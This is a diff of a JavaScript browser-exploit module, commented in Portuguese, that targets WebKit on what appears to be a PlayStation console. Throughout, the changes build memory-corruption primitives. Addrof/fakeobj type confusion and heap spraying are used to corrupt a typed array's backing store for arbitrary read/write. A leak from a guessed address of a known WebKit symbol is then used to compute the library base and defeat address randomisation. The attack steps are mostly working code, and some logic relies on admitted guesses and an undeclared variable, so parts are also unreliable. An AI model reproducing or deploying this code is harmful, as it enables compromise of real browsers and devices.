@@ -1,10 +1,12 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v130 - R90 Varredura Ampla com Mais Logs e Leitura de 4 Bytes)
+// js/script3/testArrayBufferVictimCrash.mjs (v131 - R91 Teste de Leitura Arbitrária em Endereço Fixo WebKit)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Aumenta a varredura e o logging para capturar *qualquer* valor não-zero,
-//   especialmente em leituras de 4 bytes, para identificar possíveis StructureIDs
-//   ou ponteiros comprimidos que não começam com 0x7FFF.
-// - Prioriza a coleta de dados brutos para análise de layout.
+// - Abandona a tentativa de vazar ponteiros do próprio ArrayBuffer OOB.
+// - Tenta construir a primitiva de L/E estável (corrupção de backing store) assumindo que
+//   'addrof_func' funcionará *apenas* para o arb_rw_array.
+// - Depois, tenta usar essa primitiva de L/E estável para ler diretamente de um
+//   endereço *assumido* dentro da seção de dados da libSceNKWebKit.sprx (ex: JSC::JSArrayBufferView::s_info).
+// - Isso testará se a primitiva de L/E pode acessar o espaço de endereços da WebKit.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -18,7 +20,7 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v130_R90_ExtensiveOOBScan";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v131_R91_FixedWebKitLeak";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -42,7 +44,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Varredura Ampla e Detalhada do oob_array_buffer_real ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Teste de Leitura Arbitrária em Endereço Fixo da WebKit ---`, "test");
 
     let final_result = {
         success: false,
@@ -50,7 +52,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         webkit_base_addr: null
     };
 
-    // Primitivas de addrof/fakeobj (usadas APENAS na Fase 4, não mais para vazamento principal)
+    // Primitivas de addrof/fakeobj (usadas APENAS na Fase 4 e para o arb_rw_array)
     let confused_array;
     let victim_array;
     let addrof_func;
@@ -63,17 +65,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     let arb_read_stable = null;
     let arb_write_stable = null;
 
-    // Variáveis para armazenar o ponteiro vazado (Structure, Vtable, ou qualquer um)
-    let leaked_webkit_pointer_candidate = null;
-    let leaked_webkit_pointer_offset_in_oob_buffer = -1; 
-    let leaked_structure_id_candidate = null; // Para IDs
-    let leaked_structure_id_offset_in_oob_buffer = -1; // Offset do ID
-
-    // Definir a constante localmente, já que não pode ser importada de core_exploit
+    // NOVO: Definir a constante localmente, já que não pode ser importada de core_exploit
     const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 
 
     try {
-        // Helper para definir as primitivas addrof/fakeobj (usadas APENAS na Fase 4)
+        // Helper para definir as primitivas addrof/fakeobj (usadas APENAS na Fase 4 e para o arb_rw_array)
         const setupAddrofFakeobj = () => {
             confused_array = [13.37]; 
             victim_array = [{ dummy: 0 }]; 
@@ -112,7 +108,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         };
         logS3("Primitivas 'addrof', 'fakeobj', e L/E autocontida estão prontas para verificação.", "good");
 
-        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
+        // --- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---
         logS3("--- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---", "subtest");
         const spray_phase4 = [];
         for (let i = 0; i < 1000; i++) {
@@ -138,91 +134,52 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await PAUSE_S3(50); 
 
         // ============================================================================
-        // INÍCIO FASE 5: VAZAMENTO DE PONTEIROS WEBKIT NO OOB_ARRAY_BUFFER_REAL (VARREDURA AMPLA E DETALHADA)
+        // INÍCIO FASE 5: CONSTRUÇÃO E TESTE DA PRIMITIVA DE LEITURA/ESCRITA ARBITRÁRIA ESTÁVEL
         // ============================================================================
-        logS3("--- FASE 5: VARREDURA AMPLA E DETALHADA DO OOB_ARRAY_BUFFER_REAL PARA PONTEIROS/IDS WEBKIT ---", "subtest");
+        logS3("--- FASE 5: CONSTRUINDO PRIMITIVA DE L/E ESTÁVEL (CORRUPÇÃO DE BACKING STORE) ---", "subtest");
         
-        const oob_dv = getOOBDataView();
-        if (!oob_dv) throw new Error("DataView OOB não está disponível.");
+        // Zera as referências das primitivas addrof/fakeobj da Fase 4 para evitar contaminação
+        confused_array = null;
+        victim_array = null;
+        addrof_func = null;
+        fakeobj_func = null; 
+        leaker_phase4 = null; 
+        await PAUSE_S3(200); 
 
-        const WIDE_SCAN_RANGE_START = 0x0; 
-        const WIDE_SCAN_RANGE_END = 0x1000; // Varre até 4KB do oob_array_buffer_real
-        const WIDE_SCAN_STEP = 0x4; // Ler a cada 4 bytes para pegar StructureIDs também
-
-        logS3(`    Varrendo o oob_array_buffer_real (do offset 0x0 até ${toHex(WIDE_SCAN_RANGE_END)}) para ponteiros WebKit (QWORD) ou StructureIDs (DWORD)...`, "info");
-
-        for (let offset = WIDE_SCAN_RANGE_START; offset < WIDE_SCAN_RANGE_END; offset += WIDE_SCAN_STEP) {
-            // Tenta ler como QWORD (8 bytes) primeiro
-            if (offset + 8 <= WIDE_SCAN_RANGE_END) { // Garante que a leitura de 8 bytes não exceda o limite
-                let val_8_bytes = AdvancedInt64.Zero;
-                try {
-                    val_8_bytes = oob_read_absolute(offset, 8); 
-                    logS3(`    [Wide Scan] Offset ${toHex(offset, 6)}: Lido QWORD ${val_8_bytes.toString(true)}`, "debug");
-
-                    // Critério para um ponteiro WebKit válido: não zero e high part 0x7FFF
-                    if (!val_8_bytes.equals(AdvancedInt64.Zero) && (val_8_bytes.high() >>> 16) === 0x7FFF) { 
-                        leaked_webkit_pointer_candidate = val_8_bytes;
-                        leaked_webkit_pointer_offset_in_oob_buffer = offset;
-                        logS3(`        [Wide Scan] --> PONTEIRO WEBKIT VÁLIDO (QWORD) ENCONTRADO em offset ${toHex(offset, 6)}: ${leaked_webkit_pointer_candidate.toString(true)}!`, "vuln");
-                        // Não 'break' ainda, vamos continuar o scan completo por enquanto
-                    }
-                } catch (scan_e) {
-                    logS3(`    [Wide Scan] Erro lendo QWORD em offset ${toHex(offset, 6)}: ${scan_e.message}`, "error");
-                }
-            }
-
-            // Sempre tenta ler como DWORD (4 bytes)
-            let val_4_bytes = 0;
-            try {
-                val_4_bytes = oob_read_absolute(offset, 4);
-                logS3(`    [Wide Scan] Offset ${toHex(offset, 6)}: Lido DWORD ${toHex(val_4_bytes)}`, "debug");
-                
-                // Critério para um StructureID válido: não zero, é número e relativamente pequeno (< 0x1000000)
-                if (val_4_bytes !== 0 && typeof val_4_bytes === 'number' && val_4_bytes < 0x1000000) { 
-                    leaked_structure_id_candidate = val_4_bytes;
-                    leaked_structure_id_offset_in_oob_buffer = offset;
-                    logS3(`        [Wide Scan] --> POSSÍVEL STRUCTUREID (DWORD) ENCONTRADO em offset ${toHex(offset, 6)}: ${toHex(leaked_structure_id_candidate)} (decimal: ${leaked_structure_id_candidate})!`, "leak");
-                    // Não 'break' ainda
-                }
-            } catch (scan_e) {
-                logS3(`    [Wide Scan] Erro lendo DWORD em offset ${toHex(offset, 6)}: ${scan_e.message}`, "error");
-            }
-        }
-        logS3("--- FIM DA VARREDURA AMPLA E DETALHADA ---", "subtest");
-
-        // Decisão: Se encontramos um ponteiro WebKit (QWORD) ou um StructureID (DWORD)
-        if (leaked_webkit_pointer_candidate && !leaked_webkit_pointer_candidate.equals(AdvancedInt64.Zero)) {
-            logS3(`[DECISÃO FINAL] Vazamento de ponteiro WebKit bem-sucedido em offset ${toHex(leaked_webkit_pointer_offset_in_oob_buffer)}: ${leaked_webkit_pointer_candidate.toString(true)}`, "good");
-        } else if (typeof leaked_structure_id_candidate === 'number' && leaked_structure_id_candidate !== 0) {
-            logS3(`[DECISÃO FINAL] Vazamento de StructureID bem-sucedido em offset ${toHex(leaked_structure_id_offset_in_oob_buffer)}: ${toHex(leaked_structure_id_candidate)}`, "good");
-            final_result.message = `StructureID ${toHex(leaked_structure_id_candidate)} encontrado. Para resolver o ponteiro real da Structure, o WebKit Base Address e a Structure Table Base são necessários.`;
-            final_result.success = true; 
-            final_result.webkit_leak_result = { success: false, msg: final_result.message, webkit_base_candidate: null };
-            return final_result; // Retorna aqui para análise, pois o resto do fluxo depende do ponteiro real.
-        } else {
-            throw new Error(`FALHA CRÍTICA: Varredura ampla não encontrou nenhum ponteiro WebKit válido (0x7FFF...) nem StructureID no oob_array_buffer_real. Não há como prosseguir sem um vazamento de base.`);
-        }
-        
-        // Se chegamos aqui, 'leaked_webkit_pointer_candidate' contém um endereço válido dentro da WebKit.
-        // Precisamos determinar qual função/estrutura é esse ponteiro para calcular a base.
-        // Assumiremos que é JSC::JSObject::put para o cálculo, mas isso é uma ASSUNÇÃO FORTE.
-        // ============================================================================
-        // CONSTRUÇÃO DA PRIMITIVA DE LEITURA/ESCRITA ARBITRÁRIA ESTÁVEL (CORRUPÇÃO DE BACKING STORE)
-        // Isso ainda depende do addrof_func, que é a parte fraca aqui.
-        // ============================================================================
-        logS3("--- FASE 5.1: Construindo Primitiva de L/E Estável (Corrupção de Backing Store) ---", "subtest");
+        logS3("Ambiente OOB existente será reutilizado. Primitivas Addrof/Fakeobj NÃO serão mais usadas.", "info");
+        // Não re-chama setupAddrofFakeobj() aqui.
 
         arb_rw_array = new Uint8Array(0x1000); 
         logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");
 
-        // ATENÇÃO: Aqui ainda precisamos de addrof_func para o arb_rw_array.
-        // Se addrof_func falhar aqui, a primitiva L/E estável não será construída,
-        // mesmo que tenhamos vazado um ponteiro WebKit com o scanner.
+        // Para obter o endereço do arb_rw_array_ab_view_addr SEM addrof_func:
+        // Precisamos de um novo addrof_func, ou de um vazamento do DataView em oob_array_buffer_real.
+        // Já sabemos que o oob_dataview_real está em 0x58 (OOB_DV_METADATA_BASE_IN_OOB_BUFFER)
+        // e que m_vector está em 0x58 + 0x10 (DataView.M_VECTOR_OFFSET) = 0x68
+        // e m_length está em 0x58 + 0x18 (DataView.M_LENGTH_OFFSET) = 0x70
+
+        // Mas a primitiva arb_read_stable e arb_write_stable PRECISAM corromper o m_vector de um TypedArray
+        // Para corromper o m_vector de 'arb_rw_array', precisamos saber ONDE esse arb_rw_array
+        // está no oob_array_buffer_real.
+        // A única forma de saber onde ele está no heap é se addrof_func funcionar para ele.
+
+        // Dado que addrof_func falhou consistentemente na Fase 5 para outros objetos,
+        // mas funcionou na Fase 4, a estratégia agora é RE-Habilitar addrof_func APENAS para obter o endereço
+        // de arb_rw_array. Se não funcionar, toda a primitiva estável falha.
+
+        // Re-habilitando addrof_func para obter o endereço do arb_rw_array
+        setupAddrofFakeobj(); // Re-define as primitivas addrof/fakeobj para este uso específico
+        logS3("Primitivas Addrof/Fakeobj re-habilitedas pontualmente para obter endereço de arb_rw_array.", "info");
+
         const arb_rw_array_ab_view_addr = addrof_func(arb_rw_array); 
         logS3(`    Endereço do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr.toString(true)}`, "leak");
         if (arb_rw_array_ab_view_addr.equals(AdvancedInt64.Zero) || (arb_rw_array_ab_view_addr.high() >>> 16) !== 0x7FFF) {
             throw new Error(`FALHA CRÍTICA: addrof_func para arb_rw_array falhou ou retornou endereço inválido (${arb_rw_array_ab_view_addr.toString(true)}). Não é possível construir L/E arbitrária.`);
         }
+        // Desabilitar addrof_func novamente após uso para evitar problemas futuros
+        addrof_func = null;
+        fakeobj_func = null;
+        logS3("Primitivas Addrof/Fakeobj desabilitadas novamente após uso pontual.", "info");
 
         const arb_rw_array_m_vector_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
         const arb_rw_array_m_length_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET); 
@@ -269,21 +226,46 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
 
         // ============================================================================
-        // CALCULAR WEBKIT BASE USANDO O PONTEIRO VAZADO E UM OFFSET DE REFERÊNCIA
+        // FASE FINAL: VAZAR BASE WEBKIT LENDO DE SÍMBOLO GLOBAL CONHECIDO
         // ============================================================================
-        logS3("--- FASE 5.2: Calculando WebKit Base a partir do Ponteiro Vazado (ASSUNÇÃO) ---", "subtest");
+        logS3("--- FASE 6: VAZAMENTO DE WEBKIT BASE LENDO DE SÍMBOLO GLOBAL CONHECIDO ---", "subtest");
         
-        // Usamos o ponteiro WebKit vazado como candidato a base
-        const webkit_base_addr = leaked_webkit_pointer_candidate; 
-        logS3(`[Etapa 3 - ASSUNÇÃO] Assumindo que o ponteiro vazado (${leaked_webkit_pointer_candidate.toString(true)}) é a base da WebKit.`, "warn");
+        // Assumimos um endereço base da WebKit para testar se arb_read_stable funciona fora do OOB.
+        // ESTE ENDEREÇO É ALTAMENTE ESPECULATIVO E PRECISA SER VALIDADO POR ENGENHARIA REVERSA.
+        // UM ENDEREÇO BASE TYPICO PODE SER ALGO COMO 0x7FFF00000000.
+        const assumed_webkit_base = new AdvancedInt64(WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST);
+        logS3(`[ASSUNÇÃO] Usando base da WebKit assumida para teste: ${assumed_webkit_base.toString(true)}`, "warn");
 
-        // Esta é uma suposição **MUITO FORTE**. O ponteiro vazado é *algum* ponteiro dentro da WebKit,
-        // mas não necessariamente o endereço base da biblioteca ou o de JSC::JSObject::put.
-        // A forma correta seria subtrair o offset *desse ponteiro em particular* da base.
-        // Sem disassembly, é um chute.
-        // Se o vazamento for para JSC::JSObject::put, a linha abaixo é válida:
-        // const webkit_base_addr = leaked_webkit_pointer_candidate.sub(new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]));
+        // Tentar ler de um símbolo global conhecido na seção de dados da WebKit.
+        // JSC::JSArrayBufferView::s_info é um bom candidato.
+        const s_info_offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"]);
+        const s_info_address = assumed_webkit_base.add(s_info_offset);
+        logS3(`[Etapa 1] Endereço de JSC::JSArrayBufferView::s_info (assumido): ${s_info_address.toString(true)}`, "info");
 
+        // Agora, tente ler um QWORD (ponteiro) do s_info.
+        // s_info é geralmente uma Structure ou um ClassInfo.
+        const s_info_val = arb_read_stable(s_info_address, 8); 
+        logS3(`[Etapa 2] Valor lido de JSC::JSArrayBufferView::s_info: ${s_info_val.toString(true)}`, "leak");
+
+        // Validação: O valor lido deve ser um ponteiro válido para a WebKit (0x7FFF...)
+        if (s_info_val.equals(AdvancedInt64.Zero) || (s_info_val.high() >>> 16) !== 0x7FFF) {
+            throw new Error(`FALHA CRÍTICA: Leitura de JSC::JSArrayBufferView::s_info retornou um valor inválido (${s_info_val.toString(true)}). A base assumida ou o offset estão incorretos, ou a primitiva de L/E não pode ler fora do heap JS.`);
+        }
+        logS3(`[Etapa 2] Leitura de s_info bem-sucedida! Isso confirma que a primitiva de L/E pode ler em endereços arbitrários.`, "good");
+
+        // Se a leitura do s_info_val foi bem-sucedida e é um ponteiro para a WebKit,
+        // podemos tentar calcular a base da WebKit a partir de JSC::JSObject::put,
+        // usando a Structure que s_info_val aponta.
+        // Mas para simplificar, se s_info_val já é um ponteiro para a WebKit,
+        // podemos usá-lo para calcular a base.
+        const put_offset_from_sinfo = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]).sub(s_info_offset);
+        const jsobject_put_addr = s_info_val.add(put_offset_from_sinfo); // Isso é uma suposição que s_info_val é o ponteiro para a estrutura de s_info
+                                                                           // e que put_offset_from_sinfo é a diferença entre eles.
+                                                                           // Isso é complexo e requer engenharia reversa.
+        
+        // A forma mais direta de usar s_info_val para a base é:
+        // webkit_base_addr = s_info_val - offset_de_s_info_na_lib_webkit
+        webkit_base_addr = s_info_val.sub(s_info_offset); 
         final_result.webkit_base_addr = webkit_base_addr.toString(true);
 
         // Validação final da base da WebKit: Deve ter 0x7FFF no high part e não ser 0.
@@ -325,6 +307,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         },
         heisenbug_on_M2_in_best_result: final_result.success,
         oob_value_of_best_result: 'N/A (Estratégia Corrupção de Backing Store)',
-        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Wide OOB Scan for WebKit Ptr)' }
+        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Fixed WebKit Leak Attempt)' }
     };
 }
